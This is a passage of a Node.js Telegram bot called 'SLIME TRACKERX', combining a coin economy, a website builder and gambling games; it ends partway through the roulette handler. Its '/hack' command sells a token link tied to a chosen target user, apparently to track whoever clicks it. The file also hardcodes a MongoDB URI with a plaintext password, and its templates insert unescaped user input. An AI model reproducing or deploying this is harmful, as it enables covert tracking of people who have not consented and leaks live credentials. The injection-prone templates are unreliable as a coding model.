// =====================================================
// 🎮🔥 SLIME TRACKERX v22.0 - ULTIMATE GOD EDITION 🔥🎮
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const archiver = require("archiver");
const multer = require("multer");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== FILE UPLOAD SETUP ==========
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, 'uploads/')
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + '-' + file.originalname)
  }
});
const upload = multer({ storage: storage, limits: { fileSize: 10 * 1024 * 1024 } });

// ========== SETUP ==========
app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));
app.use("/websites", express.static(path.join(__dirname, "websites")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

fs.ensureDirSync(path.join(__dirname, "websites"));
fs.ensureDirSync(path.join(__dirname, "uploads"));
fs.ensureDirSync(path.join(__dirname, "public"));

// ========== MONGODB CONNECTION ==========
const MONGODB_URI = "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected!'))
  .catch(err => console.log('❌ MongoDB Error:', err));

// ========== ENHANCED SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true, required: true },
  joinDate: { type: Date, default: Date.now },
  lastActive: Date,
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  totalEarned: { type: Number, default: 15 },
  totalSpent: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  hacks: { type: Number, default: 0 },
  hackedUsers: { type: [Number], default: [] },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  games: { type: Number, default: 0 },
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  badges: { type: [String], default: ["🎁 Newbie"] },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  totalEarnedFromWords: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  welcomeGif: { type: String, default: null },
  casinoWins: { type: Number, default: 0 },
  tournamentWins: { type: Number, default: 0 },
  lotteryTickets: { type: Number, default: 0 },
  dailyQuests: { type: Object, default: {} }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true, required: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date,
  createdAt: { type: Date, default: Date.now }
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  template: String,
  content: Object,
  images: [String],
  url: String,
  views: { type: Number, default: 0 },
  likes: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const tournamentSchema = new mongoose.Schema({
  id: String,
  name: String,
  entryFee: Number,
  prizePool: Number,
  players: [Number],
  winner: { type: Number, default: null },
  status: { type: String, default: "waiting" },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);
const Tournament = mongoose.model('Tournament', tournamentSchema);

// ========== CONFIG ==========
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;

// ========== ECONOMY ==========
const TRACK_COST = 10;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 2;
const WORK_CD = 12 * 60 * 60 * 1000;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;
const WEB_PRICE = 15;

// ========== DIFFICULTY LEVELS ==========
const difficultyLevels = {
  "easy": { name: "🍃 EASY", timer: 45, multiplier: 0.8, color: "🟢", letters: "3-4" },
  "medium": { name: "⚡ MEDIUM", timer: 30, multiplier: 1.0, color: "🟡", letters: "5-6" },
  "hard": { name: "🔥 HARD", timer: 15, multiplier: 1.5, color: "🟠", letters: "7-8" },
  "expert": { name: "💀 EXPERT", timer: 8, multiplier: 2.0, color: "🔴", letters: "9+" }
};

// ========== WORD DATABASE ==========
const wordsByLength = {
  3: ["CAT","DOG","SUN","CAR","BAG","HAT","LEG","EYE","CUP","BED","RED","HOT","BIG","NEW","OLD","FUN","RUN","SIT","EAT","FLY","CRY","JOY","SAD","WET","DRY","FAT","RAT","BAT","MAT","PAT"],
  4: ["FISH","BIRD","FROG","STAR","MOON","TREE","WIND","FIRE","ROCK","SAND","SHIP","KING","RING","SING","WING","BOOK","COOK","LOOK","HOOK","TOOK"],
  5: ["APPLE","MANGO","GRAPE","BERRY","PEACH","LEMON","MELON","GUAVA","OLIVE","PLUMS","HOUSE","TABLE","CHAIR","COUCH","SHELF","PLATE","GLASS"],
  6: ["BANANA","ORANGE","PURPLE","YELLOW","SILVER","GOLDEN","BRONZE","COPPER","MARBLE","RABBIT","TIGERS","EAGLES","SHARKS","WHALES"],
  7: ["ANIMALS","FARMERS","HUNTERS","FISHERS","DRIVERS","PLAYERS","WRITERS","READERS","SINGERS","DANCERS","TEACHER","STUDENT"],
  8: ["ELEPHANT","GIRAFFES","KANGAROO","DOLPHINS","PENGUINS","COMPUTER","KEYBOARD","MONITOR","PRINTER","SCANNER"],
  9: ["INCREDIBLE","IMPORTANT","DIFFERENT","INTERESTS","KNOWLEDGE","EDUCATION","DEVELOPER","HAPPINESS","BEAUTIFUL"]
};

function getRandomWordByLength(length) {
  let words = wordsByLength[length] || wordsByLength[5];
  return words[Math.floor(Math.random() * words.length)];
}

// ========== MEMORY CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let tokens = new Map();
let workCD = new Map();
let bannedUsers = new Set();
let processedMessages = new Set();
let wordChallenges = new Map();
let webBuilds = new Map();
let activeTournaments = new Map();
let lotteryPool = 0;
let lotteryEntries = [];

// ========== LOAD DATA ==========
async function loadData() {
  try {
    const allUsers = await User.find({});
    for (const user of allUsers) {
      usersCache.set(user.userId, user);
    }
    console.log(`📂 Loaded ${usersCache.size} users`);
    
    const allCodes = await Code.find({ expire: { $gt: new Date() } });
    for (const code of allCodes) {
      codesCache.set(code.code, code);
    }
    console.log(`📂 Loaded ${codesCache.size} active codes`);
    
    const activeTours = await Tournament.find({ status: "waiting" });
    for (const tour of activeTours) {
      activeTournaments.set(tour.id, tour);
    }
  } catch(e) {
    console.log("Error loading data:", e);
  }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId: userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch(e) {
    console.log("Error saving user:", e);
  }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  
  if (!user) {
    user = {
      userId: userId,
      joinDate: new Date(),
      lastActive: new Date(),
      coins: NEW_COINS,
      diamonds: 0,
      totalEarned: NEW_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      hacks: 0,
      hackedUsers: [],
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      games: 0,
      wins: 0,
      losses: 0,
      badges: ["🎁 Newbie"],
      wordWins: 0,
      wordLosses: 0,
      totalEarnedFromWords: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      welcomeGif: null,
      casinoWins: 0,
      tournamentWins: 0,
      lotteryTickets: 0,
      dailyQuests: {}
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        referrer.totalEarned += REF_REWARD;
        if (!referrer.badges.includes("🌟 Recruiter")) {
          referrer.badges.push("🌟 Recruiter");
        }
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 NEW REFERRAL! +${REF_REWARD} COINS\n💰 ${referrer.coins} coins | 👥 ${referrer.referrals} refs`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amt;
    user.totalEarned += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amt) {
    user.coins -= amt;
    user.totalSpent += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function canHack(userId) {
  let user = usersCache.get(userId);
  return user && user.coins >= TRACK_COST;
}

async function useHack(userId) {
  let user = usersCache.get(userId);
  if (user && user.coins >= TRACK_COST) {
    user.coins -= TRACK_COST;
    user.hacks += 1;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level += 1;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
    return true;
  }
  return false;
}

async function getUsername(userId) {
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
}

async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== REDEEM CODE SYSTEM ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code: code,
    coins: coins,
    diamonds: diamonds,
    usedBy: [],
    maxUses: Math.min(uses, 20),
    left: Math.min(uses, 20),
    expire: expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  try {
    let c = codesCache.get(code.toUpperCase());
    
    if (!c) {
      c = await Code.findOne({ code: code.toUpperCase(), expire: { $gt: new Date() } });
      if (!c) return { ok: false, msg: "❌ Invalid code!" };
    }
    
    if (Date.now() > c.expire) {
      codesCache.delete(code);
      return { ok: false, msg: "❌ Code expired!" };
    }
    
    if (c.left <= 0) {
      return { ok: false, msg: "❌ Code already used up!" };
    }
    
    if (c.usedBy.includes(userId)) {
      return { ok: false, msg: "❌ You already used this code!" };
    }
    
    await addCoin(userId, c.coins);
    if (c.diamonds > 0) {
      let user = usersCache.get(userId);
      user.diamonds += c.diamonds;
      await saveUser(userId, user);
    }
    
    c.usedBy.push(userId);
    c.left -= 1;
    await c.save();
    codesCache.set(c.code, c);
    
    let user = usersCache.get(userId);
    return { ok: true, msg: `✅ Redeemed ${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}`, coins: c.coins, newBalance: user.coins };
    
  } catch(e) {
    console.error("Redeem error:", e);
    return { ok: false, msg: "❌ Error redeeming code!" };
  }
}

// ========== SIMPLE HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${data.name || 'Portfolio'} | SLIME TRACKERX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#0a0a0a;color:#fff}
.container{max-width:1200px;margin:0 auto;padding:20px}
.navbar{display:flex;justify-content:space-between;padding:20px 0}
.logo{font-size:28px;font-weight:bold;color:#667eea}
.nav-links a{color:#fff;margin-left:20px;text-decoration:none}
.hero{text-align:center;padding:100px 0}
.hero h1{font-size:48px;margin-bottom:20px}
.btn{background:#667eea;color:#fff;padding:12px 30px;border-radius:25px;text-decoration:none;display:inline-block}
.section{background:rgba(255,255,255,0.05);border-radius:20px;padding:40px;margin:40px 0}
.section h2{margin-bottom:20px}
.skills{display:flex;gap:15px;margin-top:20px}
.skill{background:rgba(102,126,234,0.2);padding:10px 20px;border-radius:20px}
footer{text-align:center;padding:40px;border-top:1px solid #333}
@media(max-width:768px){.navbar{flex-direction:column;text-align:center}.hero h1{font-size:32px}}
</style>
</head>
<body>
<div class="container">
<div class="navbar">
<div class="logo">✨ ${data.name || 'Portfolio'}</div>
<div class="nav-links"><a href="#">Home</a><a href="#">About</a><a href="#">Contact</a></div>
</div>
<div class="hero">
<h1>${data.name || 'Welcome'}</h1>
<p>${data.title || 'Creative Developer'}</p>
<a href="#" class="btn">Contact Me</a>
</div>
<div class="section">
<h2>✨ About Me</h2>
<p>${data.bio || 'Passionate creator building amazing experiences.'}</p>
<div class="skills"><span class="skill">${data.skill1 || 'Web Dev'}</span><span class="skill">${data.skill2 || 'Design'}</span><span class="skill">${data.skill3 || 'Apps'}</span></div>
</div>
<footer><p>© 2024 ${data.name || 'Portfolio'} | Built with 🔥 by SLIME TRACKERX</p></footer>
</div>
</body>
</html>`,
  business: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.company || 'Business'} | SLIME TRACKERX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif}
.navbar{background:#1a1a2e;color:#fff;display:flex;justify-content:space-between;padding:20px 40px}
.logo{font-size:28px;font-weight:bold}
.nav-links a{color:#fff;margin-left:20px;text-decoration:none}
.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:100px 20px}
.hero h1{font-size:48px;margin-bottom:20px}
.btn{background:#fff;color:#667eea;padding:15px 40px;border-radius:30px;text-decoration:none;display:inline-block}
.container{max-width:1200px;margin:0 auto;padding:60px 20px}
.services{display:grid;grid-template-columns:repeat(3,1fr);gap:30px;margin:40px 0}
.service{background:#fff;border-radius:15px;padding:30px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1)}
.service h3{margin:15px 0}
.contact-section{background:#1a1a2e;color:#fff;text-align:center;padding:80px 20px}
footer{text-align:center;padding:30px;background:#0f0f1a;color:#fff}
@media(max-width:768px){.services{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🏢 ${data.company || 'Business'}</div><div class="nav-links"><a href="#">Home</a><a href="#">Services</a><a href="#">Contact</a></div></div>
<div class="hero"><h1>${data.company || 'Welcome'}</h1><p>${data.tagline || 'Excellence in Service'}</p><a href="#" class="btn">Get Started</a></div>
<div class="container"><h2 style="text-align:center">💼 Our Services</h2><div class="services"><div class="service"><h3>${data.service1 || 'Innovation'}</h3><p>${data.service1_desc || 'Cutting-edge solutions'}</p></div><div class="service"><h3>${data.service2 || 'Growth'}</h3><p>${data.service2_desc || 'Strategic planning'}</p></div><div class="service"><h3>${data.service3 || 'Support'}</h3><p>${data.service3_desc || '24/7 support'}</p></div></div></div>
<div class="contact-section"><h2>📞 Contact Us</h2><p>📧 ${data.email || 'info@example.com'}</p><p>📞 ${data.phone || '+1 234 567 8900'}</p></div>
<footer><p>🔥 Built with SLIME TRACKERX</p></footer>
</body>
</html>`,
  store: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.store || 'Store'} | SLIME TRACKERX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#f5f5f5}
.navbar{background:#fff;padding:20px 40px;display:flex;justify-content:space-between;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
.logo{font-size:28px;font-weight:bold;color:#667eea}
.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:80px 20px}
.products{max-width:1200px;margin:60px auto;padding:0 20px;display:grid;grid-template-columns:repeat(3,1fr);gap:30px}
.product{background:#fff;border-radius:15px;padding:20px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1)}
.price{font-size:24px;font-weight:bold;color:#667eea;margin:10px 0}
.buy-btn{background:#667eea;color:#fff;border:none;padding:12px 30px;border-radius:25px;cursor:pointer}
footer{background:#1a1a2e;color:#fff;text-align:center;padding:40px}
@media(max-width:768px){.products{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="navbar"><div class="logo">🛒 ${data.store || 'Store'}</div><div>🛍️ Cart</div></div>
<div class="hero"><h1>${data.store || 'Welcome'}</h1><p>${data.tagline || 'Premium Products'}</p></div>
<div class="products"><div class="product"><h3>${data.product1 || 'Premium Product'}</h3><div class="price">$${data.product1_price || '49'}</div><button class="buy-btn">Buy Now</button></div><div class="product"><h3>${data.product2 || 'Featured Item'}</h3><div class="price">$${data.product2_price || '79'}</div><button class="buy-btn">Buy Now</button></div><div class="product"><h3>${data.product3 || 'Deluxe Edition'}</h3><div class="price">$${data.product3_price || '99'}</div><button class="buy-btn">Buy Now</button></div></div>
<footer><p>📧 ${data.email || 'store@example.com'}</p><p>🔥 Built with SLIME TRACKERX</p></footer>
</body>
</html>`,
  gaming: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.gamertag || 'Gamer'} | SLIME TRACKERX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:monospace}
.navbar{background:#000;padding:20px;border-bottom:2px solid #0f0;text-align:center;font-size:24px;font-weight:bold}
.hero{height:100vh;display:flex;align-items:center;justify-content:center;text-align:center}
.hero h1{font-size:64px;margin-bottom:20px}
.btn{background:#0f0;color:#000;padding:15px 40px;border:none;cursor:pointer;font-weight:bold}
.games{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;padding:60px;max-width:1200px;margin:0 auto}
.game-card{background:#1a1a1a;border:1px solid #0f0;border-radius:10px;padding:30px;text-align:center}
footer{text-align:center;padding:40px;border-top:1px solid #0f0}
@media(max-width:768px){.hero h1{font-size:32px}.games{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="navbar">🎮 ${data.gamertag || 'GAMING HUB'} 🔥</div>
<div class="hero"><div><h1>${data.gamertag || 'GAMER'}</h1><p>${data.tagline || 'Level Up Your Game'}</p><button class="btn">▶ Watch Live</button></div></div>
<div class="games"><div class="game-card"><h3>🎮 ${data.game1 || 'Apex Legends'}</h3></div><div class="game-card"><h3>⚔️ ${data.game2 || 'Valorant'}</h3></div><div class="game-card"><h3>🏆 ${data.game3 || 'CS:GO'}</h3></div></div>
<footer><p>🎮 ${data.gamertag || 'Gamer'} | 🔥 Built with SLIME TRACKERX</p></footer>
</body>
</html>`,
  restaurant: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.restaurant || 'Restaurant'} | SLIME TRACKERX</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Arial,sans-serif;background:#fffaf5}
.header{background:linear-gradient(135deg,#8B4513,#A0522D);color:#fff;text-align:center;padding:80px 20px}
.header h1{font-size:48px;margin-bottom:20px}
.menu{max-width:800px;margin:60px auto;padding:0 20px}
.category{margin:40px 0}
.category h2{color:#8B4513;border-bottom:3px solid #8B4513;padding-bottom:10px;margin-bottom:20px}
.item{display:flex;justify-content:space-between;padding:15px;border-bottom:1px dashed #ddd}
.item-price{color:#8B4513;font-weight:bold}
.specials{background:#ffe4b5;padding:40px;border-radius:20px;text-align:center;margin:40px 0}
.info{background:#1a1a2e;color:#fff;text-align:center;padding:60px 20px}
footer{text-align:center;padding:30px;background:#0f0f1a;color:#fff}
</style>
</head>
<body>
<div class="header"><h1>🍽️ ${data.restaurant || 'Restaurant'}</h1><p>${data.cuisine || 'Fine Dining'}</p></div>
<div class="menu"><div class="specials"><h3>🍕 Today's Special</h3><p>${data.special || 'Chef\'s Special - 20% OFF!'}</p></div>
<div class="category"><h2>🍤 Appetizers</h2><div class="item"><div>${data.app1 || 'Bruschetta'}</div><div class="item-price">$${data.app1_price || '8'}</div></div><div class="item"><div>${data.app2 || 'Calamari'}</div><div class="item-price">$${data.app2_price || '12'}</div></div></div>
<div class="category"><h2>🥩 Main Course</h2><div class="item"><div>${data.main1 || 'Grilled Salmon'}</div><div class="item-price">$${data.main1_price || '24'}</div></div><div class="item"><div>${data.main2 || 'Ribeye Steak'}</div><div class="item-price">$${data.main2_price || '32'}</div></div></div></div>
<div class="info"><h2>📞 Reserve Your Table</h2><p>📍 ${data.address || '123 Food Street'}</p><p>📞 ${data.phone || '+1 234 567 8900'}</p><p>📧 ${data.email || 'info@restaurant.com'}</p></div>
<footer><p>🔥 Built with SLIME TRACKERX Web Creator</p></footer>
</body>
</html>`
};

// ========== WEB CREATOR COMMANDS ==========
bot.command("web", async (ctx) => {
  await ctx.reply("🌐 **WEB CREATOR** 🌐\n\nCreate websites for **15 COINS**!\n\nTemplates: portfolio, business, store, gaming, restaurant\n\n/createweb [template]\n/mywebsites");
});

bot.command("createweb", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let template = args[1];
  let u = await initUser(ctx.from.id);
  
  const templates = ["portfolio", "business", "store", "gaming", "restaurant"];
  const questions = {
    portfolio: ["name", "title", "bio", "email", "skill1", "skill2", "skill3"],
    business: ["company", "tagline", "service1", "service1_desc", "service2", "service2_desc", "service3", "service3_desc", "email", "phone"],
    store: ["store", "tagline", "product1", "product1_price", "product2", "product2_price", "product3", "product3_price", "email"],
    gaming: ["gamertag", "tagline", "game1", "game2", "game3"],
    restaurant: ["restaurant", "cuisine", "special", "app1", "app1_price", "app2", "app2_price", "main1", "main1_price", "main2", "main2_price", "address", "phone", "email"]
  };
  
  if (!template || !templates.includes(template)) return ctx.reply("❌ Templates: portfolio, business, store, gaming, restaurant");
  if (u.coins < WEB_PRICE) return ctx.reply(`❌ Need ${WEB_PRICE} coins! You have ${u.coins}`);
  
  await takeCoin(ctx.from.id, WEB_PRICE);
  webBuilds.set(ctx.from.id, { template, step: 0, data: {}, questions: questions[template] });
  await ctx.reply(`✅ Selected: ${template}\n💰 -${WEB_PRICE} coins\n\n📝 Send me your ${questions[template][0]}:`);
});

bot.command("mywebsites", async (ctx) => {
  let websites = await Website.find({ ownerId: ctx.from.id });
  if (websites.length === 0) return ctx.reply("📭 No websites yet!");
  let message = "🌐 **YOUR WEBSITES** 🌐\n\n";
  for (let site of websites) message += `• ${site.name}\n  🔗 ${site.url}\n\n`;
  await ctx.reply(message);
});

// ========== 1v1 WORD CHALLENGE ==========
bot.command("wordbattle", async (ctx) => {
  let args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`📝 **1v1 WORD CHALLENGE**

Usage: /wordbattle @username [amount] [difficulty]

Difficulties:
🍃 easy - 45 sec (3-4 letters)
⚡ medium - 30 sec (5-6 letters)
🔥 hard - 15 sec (7-8 letters)
💀 expert - 8 sec (9+ letters)

💰 Winner takes ALL coins!`);
  }
  
  let targetUsername = args[1];
  let betAmount = parseInt(args[2]);
  let difficulty = args[3].toLowerCase();
  
  if (!difficultyLevels[difficulty]) return ctx.reply("❌ Invalid difficulty!");
  if (isNaN(betAmount) || betAmount < WORD_MIN_BET) return ctx.reply(`❌ Minimum bet is ${WORD_MIN_BET} coins!`);
  if (betAmount > WORD_MAX_BET) return ctx.reply(`❌ Maximum bet is ${WORD_MAX_BET} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try {
      let c = await ctx.telegram.getChat(id);
      if (c.username === targetUsername.replace("@", "")) { targetId = id; break; }
    } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  if (targetId === ctx.from.id) return ctx.reply("❌ Cannot battle yourself!");
  
  let user = await initUser(ctx.from.id);
  if (user.coins < betAmount) return ctx.reply(`❌ You need ${betAmount} coins!`);
  
  let diff = difficultyLevels[difficulty];
  let letterCount = difficulty === "easy" ? 3 : difficulty === "medium" ? 5 : difficulty === "hard" ? 7 : 9;
  let targetWord = getRandomWordByLength(letterCount);
  
  wordChallenges.set(targetId, { from: ctx.from.id, bet: betAmount, difficulty, letterCount, targetWord, status: "waiting" });
  setTimeout(() => { if (wordChallenges.get(targetId)?.status === "waiting") wordChallenges.delete(targetId); }, 60000);
  
  await ctx.reply(`✅ Challenge sent to ${targetUsername}!\n💰 Bet: ${betAmount} coins\n${diff.color} ${diff.name}\n📏 Need a ${letterCount}-letter word`);
  await ctx.telegram.sendMessage(targetId, `📝 **WORD CHALLENGE!**\n\n@${ctx.from.username} challenges you!\n💰 Bet: ${betAmount} coins\n📏 Need a **${letterCount}-letter word**\n\nType /acceptword to accept!`);
});

bot.command("acceptword", async (ctx) => {
  let challenge = wordChallenges.get(ctx.from.id);
  if (!challenge) return ctx.reply("❌ No challenge found!");
  if (challenge.status !== "waiting") return ctx.reply("❌ Already accepted!");
  
  let accepter = await initUser(ctx.from.id);
  if (accepter.coins < challenge.bet) return ctx.reply(`❌ Need ${challenge.bet} coins!`);
  
  await takeCoin(challenge.from, challenge.bet);
  await takeCoin(ctx.from.id, challenge.bet);
  
  let diff = difficultyLevels[challenge.difficulty];
  challenge.status = "active";
  challenge.currentTurn = "challenger";
  wordChallenges.set(ctx.from.id, challenge);
  
  await ctx.telegram.sendMessage(challenge.from, `📝 **YOUR TURN!**\n\nGive a **${challenge.letterCount}-letter word**\n⏱️ ${diff.timer} seconds!\n💰 Pot: ${challenge.bet * 2} coins`);
  
  setTimeout(async () => {
    let game = wordChallenges.get(ctx.from.id);
    if (game && game.status === "active" && game.currentTurn === "challenger") {
      game.status = "completed";
      wordChallenges.delete(ctx.from.id);
      await addCoin(ctx.from.id, challenge.bet * 2);
      let winner = await initUser(ctx.from.id);
      winner.wordWins++;
      await saveUser(ctx.from.id, winner);
      await ctx.telegram.sendMessage(ctx.from.id, `🎉 **YOU WIN!**\n💰 Won ${challenge.bet * 2} coins!`);
      await ctx.telegram.sendMessage(challenge.from, `💀 **YOU LOSE!**\n💸 Lost ${challenge.bet} coins`);
    }
  }, diff.timer * 1000);
  
  await ctx.reply(`✅ Accepted! Challenger's turn!\n⏱️ ${diff.timer} seconds!`);
});

bot.command("wordstats", async (ctx) => {
  let u = await initUser(ctx.from.id);
  await ctx.reply(`📝 **WORD STATS**\n\n🏆 Wins: ${u.wordWins}\n💀 Losses: ${u.wordLosses}\n💰 Earned: ${u.totalEarnedFromWords} coins`);
});

// ========== HACK SYSTEM ==========
bot.command("hack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let targetUsername = args[1];
  if (!targetUsername) return ctx.reply(`💀 **HACK USER**\n\nUsage: /hack @username\n💰 Cost: ${TRACK_COST} coins`);
  
  let user = await initUser(ctx.from.id);
  if (user.coins < TRACK_COST) return ctx.reply(`❌ Need ${TRACK_COST} coins!`);
  
  let targetId = null;
  for (let [id] of usersCache) {
    try { let c = await ctx.telegram.getChat(id); if (c.username === targetUsername.replace("@", "")) { targetId = id; break; } } catch(e) {}
  }
  if (!targetId) return ctx.reply("❌ User not found!");
  
  await useHack(ctx.from.id);
  let token = crypto.randomBytes(8).toString("hex");
  tokens.set(token, { chat: ctx.chat.id, user: ctx.from.id, target: targetId });
  setTimeout(() => tokens.delete(token), 600000);
  
  await ctx.reply(`💀 **HACK INITIATED!**\n🎯 Target: ${targetUsername}\n💰 -${TRACK_COST} coins\n🔗 ${DOMAIN}?token=${token}`);
});

// ========== CASINO GAMES ==========
bot.command("casino", async (ctx) => {
  await ctx.reply(`🎰 **CASINO GAMES** 🎰\n\n🎲 /blackjack [amount]\n🎡 /roulette [amount] [red/black/odd/even]\n🎰 /slots [amount]\n🍀 /lottery buy [tickets]`);
});

bot.command("blackjack", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 10) return ctx.reply("❌ Minimum bet 10 coins!");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let playerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let dealerCards = [Math.floor(Math.random() * 10) + 1, Math.floor(Math.random() * 10) + 1];
  let playerTotal = playerCards.reduce((a,b) => a+b, 0);
  let dealerTotal = dealerCards.reduce((a,b) => a+b, 0);
  
  while (dealerTotal < 17) dealerTotal += Math.floor(Math.random() * 10) + 1;
  
  if (playerTotal > 21) {
    await ctx.reply(`💀 BUST! Lose ${bet} coins`);
  } else if (dealerTotal > 21 || playerTotal > dealerTotal) {
    let winAmount = bet * 2;
    await addCoin(ctx.from.id, winAmount);
    await ctx.reply(`🎉 WIN! +${winAmount} coins!`);
  } else {
    await ctx.reply(`💀 LOSE! Lose ${bet} coins`);
  }
});

bot.command("roulette", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let bet = parseInt(args[1]);
  let choice = args[2]?.toLowerCase();
  let u = await initUser(ctx.from.id);
  
  if (isNaN(bet) || bet < 5) return ctx.reply("❌ Minimum bet 5 coins!");
  if (!choice) return ctx.reply("❌ Choose: red, black, odd, even");
  if (u.coins < bet) return ctx.reply(`❌ Need ${bet} coins!`);
  
  await takeCoin(ctx.from.id, bet);
  
  let number = Math.floor(Math.random() * 37);
  let color = number === 0 ? "green" : (number % 2 === 0 ? "black" : "red");
  let isOdd = number % 2 === 1;
  
  let win = (choice === "red" && color === "red") || (choice === "black" && color === "black") || (choice === "odd" && isOdd && number !== 0) || (choice === "even" && !isOdd && number !== 0);
  
  if (win) {
    await addCoin(ctx.from.id, bet * 2);
    await ctx.reply(`🎡 Ball: ${number} (${color})\n🎉 WIN +${bet * 2} coins!`);
  } else {
